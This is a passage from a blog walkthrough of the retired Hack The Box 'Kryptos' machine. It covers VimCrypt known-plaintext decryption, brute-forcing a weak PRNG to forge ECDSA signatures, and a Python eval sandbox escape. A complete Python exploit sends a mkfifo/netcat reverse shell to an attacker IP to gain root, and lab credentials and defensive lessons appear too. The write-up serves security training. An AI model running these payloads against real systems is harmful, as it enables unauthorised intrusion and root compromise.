+<p>Since <code>ciphertext = plaintext XOR keystream</code>, we get <code>keystream = ciphertext XOR plaintext</code>.</p>
+<p>We only need the first <strong>8 bytes</strong> of known plaintext to recover the full repeating keystream:</p>
+<pre><code class="language-python" data-language="python">creds_hex  = "[redacted encoded lab material]"
+raw        = bytes.fromhex(creds_hex)
+ciphertext = raw[28:]               # skip 28-byte header
+
+known      = b"rijndael / Password1\n"
+
+# First 8 bytes of ciphertext XOR first 8 bytes of known plaintext = 8-byte keystream
+keystream  = bytes(ciphertext[i] ^ known[i] for i in range(8))
+
+# Decrypt all 26 bytes using repeating 8-byte keystream
+plaintext  = bytes(ciphertext[i] ^ keystream[i % 8] for i in range(len(ciphertext)))
+print(plaintext)
+# b'rijndael / bkVBL8Q9HuBSpj\n'
+</code></pre>
+<p><strong>Why only 8 bytes of known plaintext?</strong> Because the keystream repeats every 8 bytes. Once we know the 8-byte cycle, we can decrypt any length of ciphertext encrypted with that key.</p>
+<h3 id="result">Result</h3>
+<pre><code>SSH credentials: rijndael / bkVBL8Q9HuBSpj
+</code></pre>
+<h3 id="ssh-login-and-user-flag">SSH Login &amp; User Flag</h3>
+<pre><code class="language-bash" data-language="bash">ssh rijndael@10.129.2.163
+# password: null
+
+cat ~/user.txt
+# ad28a[redacted]53f6a03b6
+</code></pre>
+<hr />
+<h2 id="7-phase-5-broken-prng-python-eval-jail-escape-to-root">7. Phase 5 — Broken PRNG + Python Eval Jail Escape to Root</h2>
+<h3 id="discovering-the-local-service">Discovering the Local Service</h3>
+<pre><code class="language-bash" data-language="bash">ps aux | grep kryptos
+# root  ...  python3 /home/rijndael/kryptos/kryptos.py
+
+ss -tlnp | grep 81
+# 127.0.0.1:81  LISTEN
+</code></pre>
+<p>A Python web server running as <strong>root</strong> on localhost port 81. Forward it to Kali:</p>
+<pre><code class="language-bash" data-language="bash">ssh -L 81:127.0.0.1:81 rijndael@10.129.2.163
+</code></pre>
+<h3 id="analysing-kryptos-py">Analysing kryptos.py</h3>
+<p>The server has three endpoints:</p>
+<p><strong><code>GET /</code></strong> — Returns a JSON status message.</p>
+<p><strong><code>GET /debug</code></strong> — Returns a sample expression <code>2+2</code> and its ECDSA signature:</p>
+<pre><code class="language-json" data-language="json">{"response": {"Expression": "2+2", "Signature": "&lt;hex_sig&gt;"}}
+</code></pre>
+<p><strong><code>POST /eval</code></strong> — Takes <code>expr</code> and <code>sig</code>. If the ECDSA signature is valid, runs <code>eval(expr)</code> as root:</p>
+<pre><code class="language-python" data-language="python">result = eval(expr, {'__builtins__': None})  # builtins removed
+</code></pre>
+<p><strong>The two barriers to exploitation:</strong></p>
+<ol>
+<li>You need a <strong>valid ECDSA signature</strong> for your expression</li>
+<li>Python's <code>eval()</code> has <code>__builtins__</code> set to <code>None</code> — standard library functions unavailable</li>
+</ol>
+<h3 id="vulnerability-1-broken-prng-secure-rng">Vulnerability 1: Broken PRNG (secure_rng)</h3>
+<p>The signing key is generated at server startup:</p>
+<pre><code class="language-python" data-language="python">def secure_rng(seed):
+    p = 2147483647   # Mersenne prime
+    g = 2255412      # generator
+    keyLength = 32
+    ret = 0
+    ths = round((p-1)/2)
+    for i in range(keyLength * 8):
+        seed = pow(g, seed, p)
+        if seed &gt; ths:
+            ret += 2**i
+    return ret
+
+seed = random.getrandbits(128)
+rand = secure_rng(seed) + 1
+sk   = SigningKey.from_secret_exponent(rand, curve=NIST384p)
+</code></pre>
+<p>This looks like a variant of the <strong>Blum-Micali PRNG</strong>. However, <code>g=2255412</code> is not a primitive root modulo <code>p=2147483647</code>. This means:</p>
+<ul>
+<li><code>pow(g, k, p)</code> cycles through only a <strong>small subset</strong> of values (order ~331)</li>
+<li><code>secure_rng</code> maps those ~331 inputs to only <strong>~209 unique output values</strong></li>
+<li>Despite <code>seed</code> being 128-bit random, <code>rand</code> can only be one of ~209 values</li>
+</ul>
+<p><strong>Implication:</strong> The ECDSA signing key exponent has only ~209 possible values. We can brute-force which one the server is using.</p>
+<h3 id="vulnerability-2-python-eval-jail-escape">Vulnerability 2: Python eval() Jail Escape</h3>
+<p>With <code>{'__builtins__': None}</code>, direct use of <code>import</code>, <code>open</code>, <code>os</code>, etc. is blocked. But Python's object model provides a bypass through <strong>introspection</strong>:</p>
+<p>Every object in Python knows its class, its base class, and all subclasses. By walking the subclass tree from a built-in type, we can find classes that still have access to builtins:</p>
+<pre><code class="language-python" data-language="python"># Walk the MRO to find catch_warnings, which has __builtins__ in its module
+[x for x in ().__class__.__base__.__subclasses__()
+ if x.__name__ == "catch_warnings"][0]()._module.__builtins__["__import__"]("os").system("id")
+</code></pre>
+<p>Explanation:</p>
+<ul>
+<li><code>().__class__</code> = <code>tuple</code></li>
+<li><code>.__base__</code> = <code>object</code></li>
+<li><code>.__subclasses__()</code> = all classes that inherit from <code>object</code></li>
+<li>Find <code>catch_warnings</code> (from <code>warnings</code> module) which holds a reference to <code>__builtins__</code></li>
+<li>Navigate to <code>__builtins__["__import__"]</code> to import <code>os</code></li>
+<li>Call <code>os.system()</code> for command execution</li>
+</ul>
+<h3 id="the-exploit-brute-prng-sign-payload">The Exploit: Brute PRNG + Sign Payload</h3>
+<pre><code class="language-python" data-language="python">import random, binascii, requests
+from ecdsa import SigningKey, NIST384p
+
+BASE = "http://127.0.0.1:81"
+KALI = "10.10.14.6"
+
+def secure_rng(seed):
+    p = 2147483647
+    g = 2255412
+    ret = 0
+    ths = round((p - 1) / 2)
+    for i in range(32 * 8):
+        seed = pow(g, seed, p)
+        if seed &gt; ths:
+            ret += 2 ** i
+    return ret
+
+# Step 1: Get a valid (expr, sig) pair from /debug
+debug = requests.get(f"{BASE}/debug").json()['response']
+expr  = debug['Expression']     # "2+2"
+sig   = debug['Signature']
+
+# Step 2: Brute the seed space (~209 unique values, found within ~5000 random tries)
+sk = None
+for _ in range(5000):
+    seed = random.getrandbits(128)
+    rand = secure_rng(seed) + 1
+    try:
+        candidate = SigningKey.from_secret_exponent(rand, curve=NIST384p)
+        vk = candidate.get_verifying_key()
+        vk.verify(binascii.unhexlify(sig), expr.encode())
+        sk = candidate  # Found the matching key!
+        break
+    except:
+        continue
+
+# Step 3: Build and sign the jail-escape payload
+cmd     = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc {KALI} 4444 &gt;/tmp/f"
+payload = (
+    '[x for x in ().__class__.__base__.__subclasses__() '
+    'if x.__name__ == "catch_warnings"][0]()._module'
+    f'.__builtins__["__import__"]("os").system("{cmd}")'
+)
+sig_new = binascii.hexlify(sk.sign(payload.encode())).decode()
+
+# Step 4: Send to /eval — executes as root
+requests.post(f"{BASE}/eval", json={"expr": payload, "sig": sig_new}, timeout=8)
+</code></pre>
+<h3 id="receiving-the-root-shell">Receiving the Root Shell</h3>
+<p>On Kali:</p>
+<pre><code class="language-bash" data-language="bash">nc -lnvp 4444
+</code></pre>
+<pre><code># id
+uid=0(root) gid=0(root) groups=0(root)
+
+# cat /root/root.txt
+edbb9d2[redacted]10ba75cae
+</code></pre>
+<hr />
+<h2 id="8-attack-chain-summary">8. Attack Chain Summary</h2>
+<pre><code>┌─────────────────────────────────────────────────────────────────┐
+│  PHASE 1: AUTH BYPASS                                           │
+│  db=cryptor;host=10.10.14.6 → Rogue MySQL → Login as admin     │
+├─────────────────────────────────────────────────────────────────┤
+│  PHASE 2: RC4 KEYSTREAM ABUSE                                   │
+│  encrypt(encrypt(X)) = X → Decrypt /dev internal pages         │
+│  PHP filter: ?view=php://filter/.../sqlite_test_page            │
+├─────────────────────────────────────────────────────────────────┤
+│  PHASE 3: SQLITE SQLI → WEBSHELL                                │
+│  bookid=1;ATTACH DATABASE 'shell.php' AS sh;...                 │
+│  INSERT INTO sh.pwn VALUES ('&lt;?php ... ?&gt;')                     │
+│  → file_get_contents() reads arbitrary files                    │
+├─────────────────────────────────────────────────────────────────┤
+│  PHASE 4: VIMCRYPT KNOWN-PLAINTEXT XOR                          │
+│  keystream[i] = ciphertext[i] XOR known[i] (repeats every 8B)  │
+│  → rijndael / bkVBL8Q9HuBSpj → SSH → user.txt                  │
+├─────────────────────────────────────────────────────────────────┤
+│  PHASE 5: BROKEN PRNG + EVAL JAIL ESCAPE                        │
+│  secure_rng() has ~209 unique values → brute signing key        │
+│  catch_warnings subclass bypass → __builtins__ restored         │
+│  → os.system() as root → root.txt                               │
+└─────────────────────────────────────────────────────────────────┘
+</code></pre>
+<h3 id="credentials-recovered">Credentials Recovered</h3>
+<table>
+<thead>
+<tr>
+<th>Credential</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MySQL DB user</td>
+<td><code>dbuser</code> / <code>krypt0n1te</code></td>
+</tr>
+<tr>
+<td>Web login</td>
+<td><code>admin</code> / <code>admin</code> (our own rogue DB)</td>
+</tr>
+<tr>
+<td>SSH</td>
+<td><code>rijndael</code> / <code>bkVBL8Q9HuBSpj</code></td>
+</tr>
+</tbody></table>
+<h3 id="flags">Flags</h3>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>user.txt</td>
+<td><code>ad28a2[redacted]3f6a03b6</code></td>
+</tr>
+<tr>
+<td>root.txt</td>
+<td><code>edbb9d[redacted]10ba75cae</code></td>
+</tr>
+</tbody></table>
+<hr />
+<h2 id="9-key-lessons-and-concepts">9. Key Lessons &amp; Concepts</h2>
+<h3 id="1-injection-is-not-just-sql">1. Injection is Not Just SQL</h3>
+<p>The DSN injection here is <strong>protocol injection</strong> — injecting parameters into a structured string that is parsed by a library, not a database. Any time user input is concatenated into a structured string (connection strings, LDAP queries, XML, SMTP headers), injection may be possible.</p>
+<h3 id="2-trust-boundaries-who-authenticates-whom">2. Trust Boundaries: Who Authenticates Whom?</h3>
+<p>The core of Phase 1 is a <strong>trust boundary violation</strong>. The application trusted the client to declare which database server to authenticate against. Attackers who control the authentication backend control who can log in. Always hardcode infrastructure endpoints server-side.</p>
+<h3 id="3-stream-cipher-keystream-reuse-is-fatal">3. Stream Cipher Keystream Reuse is Fatal</h3>
+<p>RC4 and any stream cipher XORs plaintext with a keystream. If the <strong>same key and IV</strong> produce the same keystream, encrypting the ciphertext again recovers the plaintext. This is why TLS generates a fresh session key for every connection, and why RC4 has been deprecated from all modern protocols.</p>
+<h3 id="4-php-filter-trick-for-source-disclosure">4. PHP Filter Trick for Source Disclosure</h3>
+<p><code>php://filter/convert.base64-encode/resource=&lt;file&gt;</code> is a read primitive that bypasses any code execution restrictions. It base64-encodes the file before output, so PHP source code is returned as data rather than executed. This is a standard LFI-to-source-disclosure technique.</p>
+<h3 id="5-sqlite-attach-database-as-a-write-primitive">5. SQLite ATTACH DATABASE as a Write Primitive</h3>
+<p>When you have SQL injection into a SQLite database, <code>ATTACH DATABASE</code> turns it into a <strong>file write primitive</strong>. You can write arbitrary content to any path writable by the web server process. Combined with a world-writable web directory, this is a reliable webshell technique.</p>
+<h3 id="6-know-your-php-function-blacklists">6. Know Your PHP Function Blacklists</h3>
+<p>Dangerous function blacklists (<code>disable_functions</code> in <code>php.ini</code>) typically target <strong>execution</strong> functions: <code>system</code>, <code>exec</code>, <code>shell_exec</code>, <code>passthru</code>, <code>popen</code>, <code>proc_open</code>. They rarely include <strong>file I/O</strong> functions like <code>file_get_contents</code>, <code>readfile</code>, <code>fopen</code>. When you can't exec, pivot to reading files — credentials, source code, SSH keys.</p>
+<h3 id="7-vimcrypt-blowfish-bug-8-bit-cfb-keystream-repeat">7. VimCrypt Blowfish Bug: 8-bit CFB Keystream Repeat</h3>
+<p>Vim's <code>~02</code> Blowfish implementation uses 8-bit CFB mode incorrectly, causing the keystream to repeat every 8 bytes. With any 8 bytes of known plaintext, the full keystream is recoverable. This is why never use <code>~02</code> — use <code>~03</code> (blowfish2) or, better, use dedicated encryption tools.</p>
+<h3 id="8-small-prng-state-spaces-are-brutable">8. Small PRNG State Spaces Are Brutable</h3>
+<p>A PRNG that produces only ~209 unique outputs regardless of seed entropy is cryptographically broken. When the signing key exponent can only be one of ~209 values, brute-forcing it requires at most ~209 ECDSA key generation and signature verification operations — trivially fast. Always audit custom PRNG implementations. If <code>g</code> is not a primitive root modulo <code>p</code>, the output space collapses.</p>
+<h3 id="9-python-eval-jail-escapes-via-subclass-introspection">9. Python eval() Jail Escapes via Subclass Introspection</h3>
+<p>Removing <code>__builtins__</code> from an eval context is not a security boundary. Python's object model allows navigating from any built-in object (<code>()</code>, <code>[]</code>, <code>{}</code>) through <code>__class__.__base__.__subclasses__()</code> to find classes that still reference builtins in their module globals. The <code>catch_warnings</code> class is a reliable entry point. Sandbox-safe eval requires proper language-level isolation (e.g., a subprocess, a separate interpreter, or a purpose-built sandbox like PyPy's sandbox mode).</p>
+<h3 id="10-defense-in-depth-failures-compound">10. Defense-in-Depth Failures Compound</h3>
+<p>No single vulnerability on Kryptos is catastrophic in isolation. The box is Insane because it requires chaining five separate weaknesses. Each "fix" the developers half-implemented (restricting <code>/dev</code> by IP, disabling exec functions, using a signed eval) created a false sense of security without addressing the underlying issue. Real security requires layers that are each independently sufficient, not a chain where any one break leads to full compromise.</p>
+<hr />
+<p><em>Walkthrough by Abdullah (CyberKareem) | HTB Kryptos | Insane | Linux</em></p>
+15:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$19"}}]
+16:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$Lf",null,{"href":"/writing/hackthebox-json-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: Json Walkthrough"}]]}]}],["$","$Lf",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$Lf",null,{"href":"/writing/hackthebox-laboratory-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: Laboratory Walkthrough"}]]}]}]]}]
+17:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$Lf",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$Lf","Research",{"href":"/research","children":"Research"}],["$","$Lf","Services",{"href":"/services","children":"Services"}],["$","$Lf","Writing",{"href":"/writing","children":"Writing"}],["$","$Lf","Projects",{"href":"/projects","children":"Projects"}],["$","$Lf","About",{"href":"/about","children":"About"}],["$","$Lf","Contact",{"href":"/contact","children":"Contact"}],["$","$Lf","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$Lf",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+1a:T51f,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-kryptos-walkthrough/#article","headline":"Hack The Box: Kryptos Walkthrough","description":"An archived walkthrough of the retired Hack The Box Kryptos machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-kryptos-walkthrough/","datePublished":"2026-06-11T12:57:35.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":3641,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/d39857078d63ac190b36c202340bd35a38ae8e99/HTB-Kryptos.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-kryptos-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-kryptos-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Kryptos Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-kryptos-walkthrough/"}]}]}18:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$1a"}}]
+a:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","2",{"name":"theme-color","content":"#f2ede3"}],["$","meta","3",{"name":"color-scheme","content":"light"}]]
+1b:I[1884,[],"IconMark"]
+7:null
+c:[["$","title","0",{"children":"Hack The Box: Kryptos Walkthrough — CyberKareem"}],["$","meta","1",{"name":"description","content":"An archived walkthrough of the retired Hack The Box Kryptos machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","2",{"name":"application-name","content":"CyberKareem"}],["$","link","3",{"rel":"author","href":"https://cyberkareem.com"}],["$","meta","4",{"name":"author","content":"Abdullah Kareem"}],["$","link","5",{"rel":"manifest","href":"/site.webmanifest","crossOrigin":"$undefined"}],["$","meta","6",{"name":"keywords","content":"CyberKareem,Abdullah Kareem,security researcher,penetration tester,CVE researcher,offensive security,responsible disclosure,web application penetration testing,API security assessment,mobile application security,application security consulting"}],["$","meta","7",{"name":"creator","content":"Abdullah Kareem"}],["$","meta","8",{"name":"publisher","content":"CyberKareem"}],["$","meta","9",{"name":"robots","content":"index, follow"}],["$","link","10",{"rel":"canonical","href":"https://cyberkareem.com/writing/hackthebox-kryptos-walkthrough/"}],["$","meta","11",{"property":"og:title","content":"Hack The Box: Kryptos Walkthrough"}],["$","meta","12",{"property":"og:description","content":"An archived walkthrough of the retired Hack The Box Kryptos machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","13",{"property":"og:url","content":"https://cyberkareem.com/writing/hackthebox-kryptos-walkthrough/"}],["$","meta","14",{"property":"og:site_name","content":"CyberKareem"}],["$","meta","15",{"property":"og:locale","content":"en_US"}],["$","meta","16",{"property":"og:image","content":"https://cyberkareem.com/writing/covers/hackthebox-kryptos-walkthrough.webp"}],["$","meta","17",{"property":"og:image:width","content":"300"}],["$","meta","18",{"property":"og:image:height","content":"300"}],["$","meta","19",{"property":"og:image:alt","content":"Hack The Box Kryptos machine avatar"}],["$","meta","20",{"property":"og:type","content":"article"}],["$","meta","21",{"property":"article:published_time","content":"2026-06-11T12:57:35.000Z"}],["$","meta","22",{"property":"article:modified_time","content":"2026-07-12T00:00:00.000Z"}],["$","meta","23",{"property":"article:author","content":"https://cyberkareem.com"}],["$","meta","24",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","25",{"name":"twitter:creator","content":"@CyberKareem"}],["$","meta","26",{"name":"twitter:title","content":"Hack The Box: Kryptos Walkthrough"}],["$","meta","27",{"name":"twitter:description","content":"An archived walkthrough of the retired Hack The Box Kryptos machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","28",{"name":"twitter:image","content":"https://cyberkareem.com/writing/covers/hackthebox-kryptos-walkthrough.webp"}],["$","link","29",{"rel":"icon","href":"/icon.svg","type":"image/svg+xml"}],["$","$L1b","30",{}]]
